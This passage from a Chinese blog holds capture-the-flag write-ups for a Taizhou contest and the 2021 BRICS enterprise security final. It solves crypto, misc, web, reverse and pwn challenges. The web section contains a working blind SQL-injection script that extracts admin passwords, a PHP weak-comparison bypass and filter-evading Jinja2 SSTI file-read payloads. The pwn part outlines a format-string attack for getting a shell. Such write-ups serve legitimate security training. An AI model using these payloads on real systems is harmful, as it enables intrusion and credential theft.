<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>str1 = <span class="hljs-string">&quot;gHe6gIrSlYUqkGPeg4KNo4Vql4g6g4UqgHgHl4JNonBhlbk+och=&quot;</span><br><br>string1 = <span class="hljs-string">&quot;3ZAnJVbMd/zEkolRBDW4KUYT0ga1PF9j86qwuXHciCOfr2tLmexGhpSI+NQ5y7sv&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br><span class="hljs-built_in">print</span> (base64.b64decode(str1.translate(<span class="hljs-built_in">str</span>.maketrans(string1,string2))))<br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-reverse2-3.png"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h2><p>base循环<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-crypto-1.png"></p>
<h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>算式的结果有正确的有错误的<br>所以将结果的<code>true</code>和<code>false</code>导出为二进制<br>然后将二进制转16进制，最后再转字符串<br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1w.txt&#x27;</span>)<br>d=f.read()<br>d=d.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e=e+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">eval</span>(i)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(e,<span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-crypto2.png"></p>
<h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>e很小，低指数攻击<br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>n=<span class="hljs-number">0x86f4be77b79e166a6311e7982ba2e5ff479db93a01c56034479a9e35382293c35769da222974e9425829099aa4fe4f41185283866202042b356194bab312e6ed2fb0b10b1b74767dc1cc5306872d33b1f3b75612c594751ec70e4cf5fccc6fceafe0401648869cc40425a176ab70286d92a29dfd675f2384c9383e0a9750b25b</span><br>e=<span class="hljs-number">0x3</span><br>c=<span class="hljs-number">0x10652cdf7ed2bc53f58b321f476c3a3cf3281e541f4d533a73a0fcbf525230f2e01c183dee660676317ea99250202548e5525b0c14adbeb77d4fa7e2e1d339</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> (gmpy2.iroot(c+i*n,e)[<span class="hljs-number">1</span>]==<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>( gmpy2.iroot(c+i*n,e)[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>    i=i+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-crypto3-1.png"><br>十进制转字符串<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-crypto3-2.png"><br>md5加密后提交<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-crypto3-3.png"></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>docx本质上是一个压缩包<br>在<code>media</code>下存在包含<code>flag</code>的图片<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-misc-1.png"></p>
<h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p>尝试修改高度<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-misc2-1.png"><br>得到密码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-misc2-2.png"></p>
<p>binwalk分离出一个压缩包</p>
<p>写脚本爆破密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> rarfile,time<br><span class="hljs-keyword">import</span> threading,os<br>r=rarfile.RarFile(<span class="hljs-string">&#x27;2EDC.rar&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">pwd</span>):<br>    <span class="hljs-keyword">global</span> r<br>    <span class="hljs-keyword">try</span>:<br>        r.extractall(pwd=pwd)<br>        <span class="hljs-built_in">print</span>(pwd)<br>        os._exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e,pwd)<br>        <span class="hljs-keyword">pass</span><br>a=<span class="hljs-string">&#x27;qQaAzZwWsSxX&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> a:<br>        <span class="hljs-keyword">if</span> j.lower() <span class="hljs-keyword">in</span> (i).lower() :<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> a:<br>            <span class="hljs-keyword">if</span> k.lower() <span class="hljs-keyword">in</span> (i+j).lower():<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> a:<br>                <span class="hljs-keyword">if</span> q.lower() <span class="hljs-keyword">in</span> (i+j+k).lower():<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> a:<br>                    <span class="hljs-keyword">if</span> z.lower() <span class="hljs-keyword">in</span> (i+j+k+q).lower():<br>                        <span class="hljs-keyword">continue</span><br>                    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a:<br>                        <span class="hljs-keyword">if</span> x.lower() <span class="hljs-keyword">in</span> (i+j+k+q+z).lower():<br>                            <span class="hljs-keyword">continue</span><br>                        threading.Thread(target=decode,args=(i+j+k+q+z+x,)).start()<br>                        time.sleep(<span class="hljs-number">0.01</span>)<br><br></code></pre></td></tr></table></figure>
<p>跑出结果<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-misc2-3.png"><br>解压得到flag：<code>DASCTF&#123;f457b6a30c5b07db78e6e7562e93b4cd&#125;</code></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>台州</tag>
      </tags>
  </entry>
  <entry>
    <title>2021金砖企业信息系统安全决赛</title>
    <url>/%E7%AB%9E%E8%B5%9B/2021%E9%87%91%E7%A0%96%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9B.html</url>
    <content><![CDATA[<p>2021年就比完了初赛，但是因为疫情没能办成决赛，今年6月重启了比赛</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto-1"></a>Crypto-1</h2><p>base64-&gt;base32-&gt;base64–&gt;base64<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-crypto-1.png"></p>
<h2 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto-2"></a>Crypto-2</h2><p>变种凯撒<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-crypto-2.png"></p>
<p>上图引用的<code>caesar</code>是自定义的模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">caesar</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Type==1: Offset letters only</span><br><span class="hljs-string">        Type==2: Offset numbers only</span><br><span class="hljs-string">        Type==3: 1+2</span><br><span class="hljs-string">        Type==4: All characters</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        text=<span class="hljs-string">&quot;&quot;</span><br>        self.<span class="hljs-type">Type</span>=<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setType</span>(<span class="hljs-params">self,<span class="hljs-type">Type</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-type">Type</span> <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]:<br>            self.<span class="hljs-type">Type</span>=<span class="hljs-type">Type</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid type&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">self,text,num</span>):<br>        entext=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                <span class="hljs-keyword">if</span> text[i].isupper():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">65</span>+num)%<span class="hljs-number">26</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">65</span>)<br>                <span class="hljs-keyword">elif</span> text[i].islower():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">97</span>+num)%<span class="hljs-number">26</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">97</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    entext+=text[i]<br>            self.entext=entext<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                <span class="hljs-keyword">if</span> text[i].isnumeric():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">0x30</span>+num)%<span class="hljs-number">10</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">0x30</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    entext+=text[i]<br>            self.entext=entext<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                <span class="hljs-keyword">if</span> text[i].isupper():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">65</span>+num)%<span class="hljs-number">26</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">65</span>)<br>                <span class="hljs-keyword">elif</span> text[i].islower():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">97</span>+num)%<span class="hljs-number">26</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">97</span>)<br>                <span class="hljs-keyword">elif</span> text[i].isnumeric():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">0x30</span>+num)%<span class="hljs-number">10</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">0x30</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    entext+=text[i]<br>            self.entext=entext<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">0x30</span>+num)%<span class="hljs-number">128</span><br>                entext+=<span class="hljs-built_in">chr</span>(decup)<br>            self.entext=entext<br>        <span class="hljs-keyword">return</span> self.entext<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self,text,num=<span class="hljs-number">0</span></span>):<br>        detext=<span class="hljs-string">&#x27;&#x27;</span><br>        self.delist=[]<br>        self.detext=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num%<span class="hljs-number">26</span>,<span class="hljs-number">26</span>):<br>                detext=<span class="hljs-string">&#x27;&#x27;</span><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                    <span class="hljs-keyword">if</span> text[i].isupper():<br>                        decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">65</span>+j)%<span class="hljs-number">26</span><br>                        detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">65</span>)<br>                    <span class="hljs-keyword">elif</span> text[i].islower():<br>                        decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">97</span>+j)%<span class="hljs-number">26</span><br>                        detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">97</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        detext+=text[i]<br>                self.delist.append(detext)<br>                <span class="hljs-keyword">if</span> num:<br>                    self.detext=detext<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num%<span class="hljs-number">10</span>,<span class="hljs-number">10</span>):<br>                detext=<span class="hljs-string">&#x27;&#x27;</span><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                    <span class="hljs-keyword">if</span> text[i].isnumeric():<br>                        decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">0x30</span>+j)%<span class="hljs-number">10</span><br>                        detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">0x30</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        detext+=text[i]<br>                self.delist.append(detext)<br>                <span class="hljs-keyword">if</span> num:<br>                    self.detext=detext<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num%<span class="hljs-number">26</span>,<span class="hljs-number">26</span>):<br>                <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num%<span class="hljs-number">10</span>,<span class="hljs-number">10</span>):<br>                    detext=<span class="hljs-string">&#x27;&#x27;</span><br>                    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                        <span class="hljs-keyword">if</span> text[i].isupper():<br>                            decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">65</span>+j)%<span class="hljs-number">26</span><br>                            detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">65</span>)<br>                        <span class="hljs-keyword">elif</span> text[i].islower():<br>                            decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">97</span>+j)%<span class="hljs-number">26</span><br>                            detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">97</span>)<br>                        <span class="hljs-keyword">elif</span> text[i].isnumeric():<br>                            decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">0x30</span>+k)%<span class="hljs-number">10</span><br>                            detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">0x30</span>)<br>                        <span class="hljs-keyword">else</span>:<br>                            detext+=text[i]<br>                    self.delist.append(detext)<br>                    <span class="hljs-keyword">if</span> num:<br>                        self.detext=detext;<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num%<span class="hljs-number">128</span>,<span class="hljs-number">128</span>):<br>                detext=<span class="hljs-string">&#x27;&#x27;</span><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">128</span>+j)%<span class="hljs-number">128</span><br>                    detext+=<span class="hljs-built_in">chr</span>(decup)<br>                self.delist.append(detext)<br>                <span class="hljs-keyword">if</span> num:<br>                    self.detext=detext<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.detext):<br>            <span class="hljs-keyword">return</span> self.detext<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.delist):<br>            <span class="hljs-keyword">return</span> self.delist<br></code></pre></td></tr></table></figure>
<p>两次base64得到flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-crypto-2-2.png"></p>
<h2 id="Crypto-3"><a href="#Crypto-3" class="headerlink" title="Crypto-3"></a>Crypto-3</h2><p>先分解n<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-crypto-3.png"></p>
<p>e和phi不互素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><br>n = <span class="hljs-number">22418636922065508104264650472638100390507346675022700253583060418349386472260539292033574216754214047540225287240029292436219548116787251605020424767984000804727346173028308816952737183433110999995264950414364145519999339949396799207404153148796900954086093431917244453864253649011176295266497073733547832171165497506613139960587280135867463235266546869960044777350378595302570142110464582590415694749192915651700844268466357439219626769665355230647219887042871785185100743750953935872489085346311527806979246650668966304323450610041756764667276881295676841136337294903126776228640645138477063815764467811948872156311</span><br>e = <span class="hljs-number">180</span><br>c = <span class="hljs-number">17971123746814947059314270113966290245749007752378241906733564181493060407114219968936077930494933520528427074831694818994710527963410153282657079091353179846750982127804195747725871635911272654572811618799762595633801414107052800867035212498914627567940429340162711284873714117628807667324064684965941290688518710890089086623981356782977499005308798890348799101436318386502089586589964942282091818134339082321114129830959264557408611168516265190076744300272908807347811446203373025446057616713876047942653095947804696077860211107853183353180163392501353685418796451123620066941329424857070023018877454625734091037559</span><br>q = <span class="hljs-number">149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259583527</span><br>p = <span class="hljs-number">149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259582993</span><br><br>n1=n-p-q+<span class="hljs-number">1</span><br>t=gmpy2.gcd(e,n1)<br>e=e//t<br>d=gmpy2.invert(e,n1)<br>m=gmpy2.powmod(c,d,n)<br>msg=gmpy2.iroot(m,t)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(msg[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-crypto-3-2.png"></p>
<h2 id="Crypto-4"><a href="#Crypto-4" class="headerlink" title="Crypto-4"></a>Crypto-4</h2><p>ADFGVX解密<br>百度得到<a href="https://blog.csdn.net/euzen/article/details/119085350">原题</a></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc-1"></a>Misc-1</h2><p>直接strings<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-misc-1.png"></p>
<h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc-2"></a>Misc-2</h2><p>binwalk分解出一堆zlib文件<br>使用<code>ls | grep -v zlib | xargs strings</code>命令可以发现结尾有一串字符串<br>两次base64后得到flag</p>
<h2 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc-3"></a>Misc-3</h2><p>文件尾发现<code>id you try lsb?</code><br>stegsolve发现<code>ff d8</code>,另存为jpg<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-misc-3.png"></p>
<p>十六进制模式下发现一串字符串<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-misc-3-2.png"></p>
<p>base64解密后得到flag</p>
<h2 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc-4"></a>Misc-4</h2><p>音频文件，播放后具有非常明显的sstv特征<br>在手机上使用<code>robot36</code>监听得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-misc4.png"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web-1"></a>Web-1</h2><p>在js中可以看到游戏的逻辑<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-web-1.png"></p>
<p>访问<code>23881361B86C77CD.php</code>，点击<code>key在这里</code>会跳转，抓包，在返回值中得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-web-1-2.png"></p>
<h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web-2"></a>Web-2</h2><p>简单过滤的sql盲注<br>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sqlinjet</span>(<span class="hljs-params">url,payload</span>):<br>    header=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&quot;UM_distinctid = 175b18dcb384ba-0f290792fb4f06-230346d-144000-175b18dcb39493;CNZZDATA1261218610 =1200642698-1605001662-%7C1605366994&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>            &#125;<br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">128</span><br>        mid = (low + high) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span>(low &lt; high):<br>            data = &#123;<br>                <span class="hljs-string">&#x27;uname&#x27;</span>: payload.<span class="hljs-built_in">format</span>(i,mid),<br>                <span class="hljs-string">&#x27;passwd&#x27;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>            &#125;<br>            r = requests.post(url=url,data=data,headers=header)<br>            <span class="hljs-built_in">print</span>(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;不存在此用户&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>               low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>               high = mid<br>            mid = (low + high) // <span class="hljs-number">2</span><br>        flag += <span class="hljs-built_in">chr</span>(mid)<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid == <span class="hljs-number">132</span>:<br>            <span class="hljs-keyword">break</span><br><br>url=<span class="hljs-string">&#x27;http://101.133.132.222:8002/login.php&#x27;</span><br>payload_all_database=<span class="hljs-string">&quot;&quot;</span><br>payload_database=<span class="hljs-string">&quot;1&#x27;^(ascii(substring((select(database()))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;</span><br>payload_table=<span class="hljs-string">&quot;1&#x27;^(ascii(substring((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where(table_schema=database()))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;</span><br><br>uname=<span class="hljs-string">&quot;1&#x27;^(ascii(substring((select(group_concat(uname))from(admin))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;</span><br>password=<span class="hljs-string">&quot;1&#x27;^(ascii(substring((select(group_concat(passwd))from(admin))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;</span><br>sqlinjet(url,password)<br></code></pre></td></tr></table></figure>

<p>注入得到密码，md5解密后得到<code>5555666</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-web-2.png"></p>
<p>登录拿到flag</p>
<h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web-4"></a>Web-4</h2><p>扫描目录得到<code>index.php.bak</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-web-4-1.png"></p>
<p>得到部分源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>])<br></code></pre></td></tr></table></figure>
<p>php弱比较，传入两个数组即可</p>
<p>payload:<br><code>http://101.133.132.222:8004/index.php?name[]=admin&amp;pwd[]=admin123</code></p>
<h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web-5"></a>Web-5</h2><p>题目url后的路径可控，会直接回显出来<br>尝试<code>xss</code>和<code>ssti</code><br>发现存在<code>xss</code>，但是<code>xss</code>不好利用，使用<code>&#123;&#123;7*7&#125;&#125;</code>测试，发现也存在<code>ssti</code>注入</p>
<p>报错后得到框架是<code>jinja2</code></p>
<p>fuzz后发现过滤了<code>class.</code>关键字，可以通过加号拼接<code>class</code>来绕过</p>
<p>先获取<code>FileLoader</code>类<br><code>http://101.133.132.222:8005/&#123;&#123;()['__cla'+'ss__'].__base__['__subclas'+'ses__']()&#125;&#125;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-web-5-1.png"></p>
<p>调用类<code>get_data</code>方法读文件<br><code>http://101.133.132.222:8005/&#123;&#123;()['__cla'+'ss__'].__base__['__subclas'+'ses__']()[79]["get_data"](0,"/flag")&#125;&#125;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-web-5-2.png"></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse-1"></a>Reverse-1</h2><p>直接strings<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-reverse-1.png"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn-1"></a>Pwn-1</h2><p>查看代码发现<code>main</code>函数中存在两次格式化字符串</p>
<p>通过第一次格式化字符串获取<code>__libc_start_main</code>函数地址<br>同时获取<code>libc</code>地址，通过<code>libc</code>获取<code>system</code>函数地址</p>
<p>通过第二次格式化字符串将<code>fini_array</code>替换为<code>main</code>函数<br>使我们可以再次输入数据，并把<code>printf</code>函数在<code>got</code>表中的数据修改为<code>system</code>函数地址<br>这样在第二次执行<code>main</code>函数时，输入<code>/bin/sh</code>或<code>sh</code>就可以执行<code>system(&quot;/bin/sh&quot;)</code>来获取<code>shell</code>了</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/jz-pwn-1-2.png"></p>
<p>exp</p>
